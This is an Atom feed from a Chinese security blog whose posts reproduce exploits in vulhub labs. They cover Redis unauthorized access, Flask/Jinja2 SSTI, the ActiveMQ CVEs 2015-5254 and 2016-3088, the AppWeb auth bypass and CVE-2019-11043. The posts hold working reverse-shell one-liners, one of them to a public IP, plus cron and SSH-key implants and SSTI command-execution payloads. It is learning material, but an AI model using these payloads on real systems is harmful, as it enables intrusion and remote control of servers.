<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://www.yyxyy.xyz/</id>
    <title>Yyx</title>
    <updated>2021-08-23T14:07:29.603Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://www.yyxyy.xyz/"/>
    <link rel="self" href="https://www.yyxyy.xyz/atom.xml"/>
    <subtitle>记得在这杂乱的生活里，带点微笑</subtitle>
    <logo>https://www.yyxyy.xyz/images/avatar.png</logo>
    <icon>https://www.yyxyy.xyz/favicon.ico</icon>
    <rights>All rights reserved 2021, Yyx</rights>
    <entry>
        <title type="html"><![CDATA[Redis未授权利用及思考]]></title>
        <id>https://www.yyxyy.xyz/post/redis-wei-shou-quan-li-yong-ji-si-kao/</id>
        <link href="https://www.yyxyy.xyz/post/redis-wei-shou-quan-li-yong-ji-si-kao/">
        </link>
        <updated>2021-08-23T14:02:37.000Z</updated>
        <content type="html"><![CDATA[<h1 id="redis几种基本拿shell的方法">redis几种基本拿shell的方法</h1>
<h2 id="0x01-计划任务执行命令反弹shell">0x01 计划任务执行命令反弹shell</h2>
<pre><code class="language-shell">set xxx &quot;\n\n* * * * * bash -i&gt;&amp; /dev/tcp/104.168.147.13/8888 0&gt;&amp;1\n\n&quot;
config set dir /var/spool/cron
config set dbfilename root
save
</code></pre>
<h2 id="0x02-写web目录">0x02 写web目录</h2>
<pre><code class="language-shell">config set dir /tmp/   这里应该是web目录
config set dbfilename test.php
set 1 &quot;&lt;?= phpinfo(); ?&gt;&quot;
save
</code></pre>
<h2 id="0x03-写ssh-key">0x03 写SSH key</h2>
<pre><code class="language-shell">ssh-key -t rsa#然后按照next执行就行了
(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; test.txt
cat test.txt |redis-cli -h 192.168.0.109 -a 123456 -x set crackit
redis执行
config set dir /root/.ssh
config set dbfilename authorized_keys
save
</code></pre>
<h2 id="0x04-主从复制">0x04 主从复制</h2>
<p>https://github.com/vulhub/redis-rogue-getshell</p>
<p>https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</p>
<h1 id="redis-在win下面的利用及思考">redis 在win下面的利用及思考</h1>
<h2 id="网上常见的方法">网上常见的方法</h2>
<p>1.web目录写马</p>
<p>2.写启动项</p>
<p>https://www.bilibili.com/read/cv7358287/</p>
<p>https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</p>
<h2 id="一些其它的方法">一些其它的方法</h2>
<p>1.dll劫持</p>
<p>2.覆写一些文件，让用户点击。</p>
<p>3.覆写sethc.exe。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Flask ssti 漏洞复现]]></title>
        <id>https://www.yyxyy.xyz/post/flask-ssti-lou-dong-fu-xian/</id>
        <link href="https://www.yyxyy.xyz/post/flask-ssti-lou-dong-fu-xian/">
        </link>
        <updated>2021-06-09T08:01:44.000Z</updated>
        <content type="html"><![CDATA[<h4 id="flask-ssti-漏洞复现">Flask ssti 漏洞复现</h4>
<h6 id="环境">环境</h6>
<p>使用vulhub里面的flask/ssti环境</p>
<h6 id="查看源码发现漏洞处">查看源码，发现漏洞处</h6>
<pre><code class="language-python">from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    name = request.args.get('name', 'guest')

    t = Template(&quot;Hello &quot; + name)
    return t.render()

if __name__ == &quot;__main__&quot;:
    app.run()
    
    
// 很简单发现了name变量是我们能够控制的。
</code></pre>
<h6 id="漏洞成因分析">漏洞成因分析</h6>
<p>首先输入正常值</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/1.png" alt="" loading="lazy"></figure>
<p>然后输入嵌套jinja2语法的语句</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/2.png" alt="" loading="lazy"></figure>
<p>很容易就发现了这一处漏洞</p>
<h6 id="代码修复">代码修复</h6>
<pre><code class="language-python">from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    name = request.args.get('name', 'guest')

    t = Template(&quot;Hello &quot; + {{temp}})
    return t.render(temp=&quot;name&quot;)

if __name__ == &quot;__main__&quot;:
    app.run()
    
//这样就能避免这个漏洞
</code></pre>
<h6 id="漏洞利用">漏洞利用</h6>
<p>vulhub的POC</p>
<pre><code class="language-jinja2">{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__(&quot;os&quot;).popen(&quot;id&quot;).read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
</code></pre>
<p>得到一下结果</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/3.png" alt="" loading="lazy"></figure>
<h6 id="python沙盒逃逸">python沙盒逃逸</h6>
<p>vulhub的POC里面用的是一些python的魔术方法，因为在jinja2里面我们是可以访问python的一些对象和方法。</p>
<p>Python的一些魔术方法</p>
<pre><code class="language-python"># 1 __class__ : 返回当前对象所属的类
&gt;&gt;&gt; ().__class__
&lt;class 'tuple'&gt;
&gt;&gt;&gt; [].__class__
&lt;class 'list'&gt;

#2 __base__&amp;&amp;__bases__ :作用都是返回当前类所继承的类，即基类，区别是base返回单个，bases以元组形式返回所有基类。
&gt;&gt;&gt; class A():
...     pass
&gt;&gt;&gt; class B():
...     pass
&gt;&gt;&gt; class C(A,B):
...     pass
&gt;&gt;&gt; C.__base__
&lt;class '__main__.A'&gt;
&gt;&gt;&gt; C.__bases__
(&lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;)

#3 __mro__ :以元组的方式返回继承关系
&gt;&gt;&gt; C.__mro__
(&lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;, &lt;class 'object'&gt;)


#4 __subclasses__():以列表的形式返回类的子类
&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()
[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes'&gt;, &lt;class 'list'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'traceback'&gt;, &lt;class 'super'&gt;, &lt;class 'range'&gt;, &lt;class 'dict'&gt;, &lt;class 'dict_keys'&gt;, &lt;class 'dict_values'&gt;, &lt;class 'dict_items'&gt;, &lt;class 'odict_iterator'&gt;, &lt;class 'set'&gt;, &lt;class 'str'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'complex'&gt;, &lt;class 'float'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'property'&gt;, &lt;class 'managedbuffer'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'tuple'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'reversed'&gt;, &lt;class 'stderrprinter'&gt;, &lt;class 'code'&gt;, &lt;class 'frame'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'method'&gt;, &lt;class 'function'&gt;, &lt;class 'mappingproxy'&gt;, &lt;class 'generator'&gt;, &lt;class 'getset_descriptor'&gt;, &lt;class 'wrapper_descriptor'&gt;, &lt;class 'method-wrapper'&gt;, &lt;class 'ellipsis'&gt;, &lt;class 'member_descriptor'&gt;, &lt;class 'types.SimpleNamespace'&gt;, &lt;class 'PyCapsule'&gt;, &lt;class 'longrange_iterator'&gt;, &lt;class 'cell'&gt;, &lt;class 'instancemethod'&gt;, &lt;class 'classmethod_descriptor'&gt;, &lt;class 'method_descriptor'&gt;, &lt;class 'callable_iterator'&gt;, &lt;class 'iterator'&gt;, &lt;class 'coroutine'&gt;, &lt;class 'coroutine_wrapper'&gt;, &lt;class 'EncodingMap'&gt;, &lt;class 'fieldnameiterator'&gt;, &lt;class 'formatteriterator'&gt;, &lt;class 'filter'&gt;, &lt;class 'map'&gt;, &lt;class 'zip'&gt;, &lt;class 'moduledef'&gt;, &lt;class 'module'&gt;, &lt;class 'BaseException'&gt;, &lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib._installed_safely'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class 'classmethod'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib._ImportLockContext'&gt;, &lt;class '_thread._localdummy'&gt;, &lt;class '_thread._local'&gt;, &lt;class '_thread.lock'&gt;, &lt;class '_thread.RLock'&gt;, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;, &lt;class '_frozen_importlib_external._LoaderBasics'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class '_io._IOBase'&gt;, &lt;class '_io._BytesIOBuffer'&gt;, &lt;class '_io.IncrementalNewlineDecoder'&gt;, &lt;class 'nt.ScandirIterator'&gt;, &lt;class 'nt.DirEntry'&gt;, &lt;class 'PyHKEY'&gt;, &lt;class 'zipimport.zipimporter'&gt;, &lt;class 'codecs.Codec'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class 'abc.ABC'&gt;, &lt;class 'collections.abc.Hashable'&gt;, &lt;class 'collections.abc.Awaitable'&gt;, &lt;class 'collections.abc.AsyncIterable'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'collections.abc.Iterable'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'dict_keyiterator'&gt;, &lt;class 'dict_valueiterator'&gt;, &lt;class 'dict_itemiterator'&gt;, &lt;class 'list_iterator'&gt;, &lt;class 'list_reverseiterator'&gt;, &lt;class 'range_iterator'&gt;, &lt;class 'set_iterator'&gt;, &lt;class 'str_iterator'&gt;, &lt;class 'tuple_iterator'&gt;, &lt;class 'collections.abc.Sized'&gt;, &lt;class 'collections.abc.Container'&gt;, &lt;class 'collections.abc.Callable'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class '_sitebuiltins._Helper'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;]

#5 __globals__ :以字典的形式返回函数所在模块命名空间的所有变量。
#所有的函数都会有一个__globals__属性，可以通过globals获得大量内置函数，包括eval，exec等执行命令的1的函数

#6 __builtin__&amp;&amp;__builtins__: python中直接能用的比如int(),list()等函数，可以直接在builtins里面查询到。（python3）
&gt;&gt;&gt; import builtins
&gt;&gt;&gt; dir(builtins)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']

#python2：dir(__builtins__)
'''
__builtin__ 和 __builtins__之间是什么关系呢？
1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。
2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身
'''



#利用python特殊方法bypass沙盒


## 构造继承链的思想

#1.任意使用一个内置对象用class拿到他所对应的类
#2.用bases拿到基类（&lt;class 'object'&gt;）
#3.用subclasses()拿到子类列表
#4.在字类里面寻找可以利用的类

&gt;&gt;&gt; t = ().__class__.__bases__[0].__subclasses__()
&gt;&gt;&gt; for c in t:
...     if c.__name__== 'file':
...             print t.index(c)
... 
40
#寻找file对象


&gt;&gt;&gt; dir(().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines)
['__call__', '__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
#使用dir查看对象内置方法：



</code></pre>
<p>同样的方法使用eval方法来获取目录文件</p>
<pre><code class="language-jinja2">{% for c in ().__class__.__bases__[0].__subclasses__(): %}
{% if c.__name__ == '_IterationGuard': %}
{{c.__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('ls').read()&quot;) }}
{% endif %}
{% endfor %}
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/4.png" alt="" loading="lazy"></figure>
<p>参考链接：<a href="https://www.freebuf.com/articles/web/98619.html">https://www.freebuf.com/articles/web/98619.html</a></p>
<p>​		<a href="https://www.cnblogs.com/hackxf/p/10480071.html">https://www.cnblogs.com/hackxf/p/10480071.html</a></p>
<p>​		<a href="https://eustiar.com/archives/157">https://eustiar.com/archives/157</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2015-5254]]></title>
        <id>https://www.yyxyy.xyz/post/cve-2015-5254/</id>
        <link href="https://www.yyxyy.xyz/post/cve-2015-5254/">
        </link>
        <updated>2021-06-09T07:58:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="activemq-反序列化漏洞cve-2015-5254复现">ActiveMQ 反序列化漏洞（CVE-2015-5254）复现</h2>
<h4 id="漏洞简介">漏洞简介</h4>
<p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。</p>
<h4 id="漏洞复现">漏洞复现</h4>
<ol>
<li>
<p>漏洞利用过程</p>
<ol>
<li>构造可执行命令的序列化对象</li>
<li>作为一个消息发送给目标61616端口</li>
<li>访问的Web管理页面，读取消息，触发漏洞</li>
</ol>
</li>
<li>
<p>使用jmet进行漏洞利用</p>
<pre><code class="language-shell"> wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
 mkdir external
</code></pre>
</li>
<li>
<p>执行命令</p>
<ol>
<li>
<pre><code class="language-shell">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/sucess&quot; -Yp ROME   127.0.0.1   61616
</code></pre>
</li>
</ol>
</li>
</ol>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254/1.png" alt="" loading="lazy"></figure>
<ol start="4">
<li>此时目标站ActiveMQ会收到名为事件的队列，在admin/queues.jsp下面（账号admin密码admin）</li>
</ol>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254/2.png" alt="" loading="lazy"></figure>
<ol start="5">
<li>
<p>点击这个消息便出发了漏洞</p>
</li>
<li>
<p>此时进入容器，发现存在tmp目录已经创建说明漏洞利用成功</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//3.png" alt="" loading="lazy"></figure>
</li>
</ol>
<p>最后反弹shell</p>
<p>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bin -i &gt;&amp; /dev/tcp/127.0.0.1/7777 0&gt;&amp;1&quot; -Yp ROME 192.168.180.133 61616</p>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//4.png" alt="" loading="lazy"></figure>
<p>点击消息</p>
<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//5.png" alt="" loading="lazy"></figure>
<p>反弹shell成功</p>
<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//6.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2016-3088]]></title>
        <id>https://www.yyxyy.xyz/post/cve-2016-3088/</id>
        <link href="https://www.yyxyy.xyz/post/cve-2016-3088/">
        </link>
        <updated>2021-06-09T07:57:28.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cve-2016-3088漏洞复现">CVE-2016-3088漏洞复现</h1>
<h2 id="背景描述">背景描述</h2>
<p>ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用。</p>
<h2 id="原理分析">原理分析</h2>
<p>ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录，且路径在conf/jetty.xml中定义，定义如下：</p>
<pre><code class="language-xml">&lt;bean class =“ org.eclipse.jetty.webapp.WebAppContext”&gt;
    &lt;property name =“ contextPath” value =“ / fileserver” /&gt;
    &lt;property name =“ resourceBase” value =“ $ {activemq.home} / webapps / fileserver” /&gt;
    &lt;property name =“ logUrlOnStart” value =“ true” /&gt;
    &lt;property name =“ parentLoaderPriority” value =“ true” /&gt;
&lt;/ bean&gt;
</code></pre>
<pre><code>fileserver:储存文件的接口，可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，
其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但是随后发现：
1.其使用率并不高
2.文件操作容易出现漏洞
所以ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。
</code></pre>
<h2 id="漏洞利用">漏洞利用</h2>
<p>首先写入一个文件，随后使用移动文件的请求将文件移动到任意位置，<br>
造成任意文件写入漏洞。文件写入有如下方法可以利用：</p>
<ol>
<li>写入webshell</li>
<li>写入cron或ssh key等文件</li>
<li>写入jar或jetty.xml等库和配置文件</li>
</ol>
<h2 id="漏洞复现">漏洞复现</h2>
<p>1.上传webshell，但是不会解析</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/1.png" alt="" loading="lazy"></figure>
<p>2.移动到api目录下面（api下面会解析）</p>
<p>首先看一下api路径（(http://ip:8161/admin/test/systemProperties.jsp)）</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/2.png" alt="" loading="lazy"></figure>
<p>移动到api目录下。</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/3.png" alt="" loading="lazy"></figure>
<p>查看api目录</p>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/4.png" alt="" loading="lazy"></figure>
<p>3.执行命令</p>
<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/5.png" alt="" loading="lazy"></figure>
<p>利用完毕。</p>
<p>4.利用cron添加定时任务反弹shell</p>
<p>添加shell脚本</p>
<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/6.png" alt="" loading="lazy"></figure>
<p>移动shell脚本到/etc/cron.d下面</p>
<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/7.png" alt="" loading="lazy"></figure>
<p>反弹shell</p>
<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/8.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/9.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[docker命令学习]]></title>
        <id>https://www.yyxyy.xyz/post/docker-ming-ling-xue-xi/</id>
        <link href="https://www.yyxyy.xyz/post/docker-ming-ling-xue-xi/">
        </link>
        <updated>2021-06-06T03:58:04.000Z</updated>
        <content type="html"><![CDATA[<h4 id="docker">docker</h4>
<h6 id="开启docker">开启docker</h6>
<pre><code class="language-shell">systemctl start docker
</code></pre>
<h6 id="关闭docker">关闭docker</h6>
<pre><code class="language-shell">service docker stop  或者  systemctl stop docker
</code></pre>
<h6 id="容器列表">容器列表</h6>
<pre><code class="language-shell">docker ps

docker ps -a
</code></pre>
<h6 id="开启容器">开启容器</h6>
<pre><code class="language-shell">docker start 容器名称  
比如开启名字为cli容器： docker start cli
</code></pre>
<h6 id="vulhub靶场">vulhub靶场</h6>
<pre><code class="language-shell">docker-compose up -d         //docker生成靶场
 
docker-compose down        //要进入另一个漏洞靶场，则先要结束掉当前漏洞靶场
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2018-8715复现]]></title>
        <id>https://www.yyxyy.xyz/post/cve-2018-8715-fu-xian/</id>
        <link href="https://www.yyxyy.xyz/post/cve-2018-8715-fu-xian/">
        </link>
        <updated>2021-06-06T03:57:21.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cve-2018-8715复现">CVE-2018-8715复现</h1>
<h4 id="前提条件">前提条件</h4>
<p>首先得已知一个用户名</p>
<h4 id="appweb简介">AppWeb简介</h4>
<p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
<ul>
<li>1.basic 传统HTTP基础认证</li>
<li>2.digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
<li>3.form 表单认证</li>
</ul>
<h4 id="漏洞描述">漏洞描述</h4>
<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
<h4 id="漏洞复现">漏洞复现</h4>
<p>0x1 访问目标站</p>
<p>输入已知账号，然后抓包。</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2018-8715/1.png" alt="" loading="lazy"></figure>
<p>0x2 修改请求方式，添加session</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2018-8715/2.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2018-8715/3.png" alt="" loading="lazy"></figure>
<p>这一步拿到session我们也可以直接在浏览器添加cookie，也能完成。</p>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2018-8715/4.png" alt="" loading="lazy"></figure>
<p>[+]具体参考链接<a href="https://www.freebuf.com/column/221660.html">https://www.freebuf.com/column/221660.html</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2019-11043漏洞复现&&反弹shell]]></title>
        <id>https://www.yyxyy.xyz/post/cve-2019-11043-lou-dong-fu-xian-andfan-dan-shell/</id>
        <link href="https://www.yyxyy.xyz/post/cve-2019-11043-lou-dong-fu-xian-andfan-dan-shell/">
        </link>
        <updated>2021-06-06T03:56:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="cve-2019-11043漏洞复现反弹shell">CVE-2019-11043漏洞复现&amp;&amp;反弹shell</h3>
<h4 id="1漏洞介绍">1.漏洞介绍</h4>
<p>nginx + php-fpm 配置不当，当nginx配置文件中有<code>fastcgi_split_path_info</code>，却没有if(!-<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>o</mi><mi>c</mi><mi>u</mi><mi>m</mi><mi>e</mi><mi>n</mi><msub><mi>t</mi><mi>r</mi></msub><mi>o</mi><mi>o</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">document_root</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mord mathdefault">c</span><span class="mord mathdefault">u</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span></span></span></span>fastcgi_script_name){return 404;}`的时候就会导致远程代码执行。</p>
<p>像服务器url发送%0a时，服务器返回异常。</p>
<p>该漏洞需要在nginx.conf中进行特定配置才能触发。具体配置如下：</p>
<pre><code class="language-nginx">location ~ [^/]\.php(/|$) {
 ...
 fastcgi_split_path_info ^(.+?\.php)(/.*)$;
 fastcgi_param PATH_INFO $fastcgi_path_info;
 fastcgi_pass   php:9000;
 ...
}
</code></pre>
<p>攻击者可以使用换行符（％0a）来破坏<code>fastcgi_split_path_info</code>指令中的Regexp。 Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。</p>
<p>fastcgi_split_path_info：<a href="https://segmentfault.com/a/1190000002667095">https://segmentfault.com/a/1190000002667095</a></p>
<h4 id="2漏洞复现">2.漏洞复现</h4>
<p>环境使用的vulhub</p>
<p>具体参考：<a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md</a></p>
<p>环境需要 docker、golang</p>
<pre><code class="language-shell">sudo apt-get install docker docker-compose
sudo apt install golang
</code></pre>
<p>环境搭建完成打开127.0.0.1:8080就能访问</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/1.png" alt="" loading="lazy"></figure>
<p>安装漏洞利用工具</p>
<pre><code class="language-shell">git clone https://github.com/neex/phuip-fpizdam.git
cd phuip-fpizdam
